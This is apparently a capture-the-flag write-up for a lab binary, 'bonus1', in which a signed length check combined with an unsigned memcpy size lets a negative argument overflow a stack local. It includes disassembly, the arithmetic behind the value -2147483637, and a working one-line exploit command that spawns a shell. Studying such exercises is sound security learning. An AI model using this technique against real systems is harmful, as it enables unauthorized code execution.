# Way to bonus2

## Core
`main` does `n = atoi(argv[1])`, checks `n <= 9` (**signed**), then
`memcpy(dest=esp+0x14, argv[2], n*4)`. The copy size `n*4` is used as an unsigned `size_t`,
so a **negative `n` passes the signed `<= 9` check yet produces a large, wrap-around copy
length** — a classic signed/int-overflow mismatch. We pick `n` so that `n*4` (mod 2^32) is
exactly the 44 bytes needed to overflow `dest` up to the saved `n` slot at `esp+0x3c` and
overwrite it. If that dword becomes `0x574f4c46` (`"FLOW"`), `main` runs `execl` on a shell.

## Decisive disass (full: `disas main`, `x/s` the execl args)
```
main:
<+20>: call atoi@plt          ; n = atoi(argv[1])
<+25>: mov %eax,0x3c(%esp)     ; n stored at esp+0x3c   <- also the win-check target
<+29>: cmpl $0x9,0x3c(%esp)    ; signed check...
<+34>: jle  <+43>              ; ...n <= 9 to proceed  (negative n passes)
<+47>: lea 0x0(,%eax,4),%ecx   ; ecx = n*4  (size_t) — int overflow lives here
<+64>: lea 0x14(%esp),%eax     ; dest = esp+0x14
<+79>: call memcpy@plt         ; memcpy(esp+0x14, argv[2], n*4)
<+84>: cmpl $0x574f4c46,0x3c(%esp)  ; is *(esp+0x3c) == "FLOW"?
<+117>: call execl@plt         ; execl(0x8048583,0x8048580,0) -> shell  (x/s both = "/bin/sh","sh")
```
Buffer-to-target distance: `0x3c - 0x14 = 0x28 = 40` bytes, +4 to overwrite the dword = **44**.

## Exploit
- Size value `n = -2147483637` (derivation): need `n*4 ≡ 44 (mod 2^32)` while `n <= 9` signed.
  `atoi("-2147483637") = 0x8000000B`; `0x8000000B * 4 = 0x2_0000_002C`, low 32 bits = `0x2C = 44`.
  (`-2147483648 = 0x80000000` → `*4 = 0x2_0000_0000` → 0 bytes; add 11 to get the 44 we need.)
  Confirmed by ltrace: `./bonus1 -2147483647 ss` → `atoi = 0x80000001`, `memcpy(...,"ss",4)`.
- Payload (`argv[2]`, 44 bytes): `"A"*40 + "FLOW"`. The last 4 bytes land on `esp+0x3c`, making
  the dword `0x574f4c46` ("FLOW" = `\x46\x4c\x4f\x57` little-endian) → the `cmp` passes.
- Delivery: two **argv** args (`n`, overflow string); win jumps to the program's own
  `execl("/bin/sh","sh",0)` → no injected shellcode, no cat trick.
```bash
./bonus1 -2147483637 $(python -c 'print "A"*40 + "FLOW"')
```

## Diff from previous
bonus0 was a **stack return-address** overwrite (strncpy no-NUL + strcpy chaining) that jumped
to **injected shellcode** on the stack. bonus1 corrupts no return address and injects no code:
it abuses a **signed/unsigned mismatch** — `n` passes a signed `<= 9` gate but `n*4` wraps to a
large unsigned `memcpy` size — to overflow a local and plant the magic value `0x574f4c46` that
a `cmp` guards, letting `main`'s **own** `execl` spawn the shell. First level won via an
**integer-overflow sizing bug** rather than a copy-with-no-length-check.

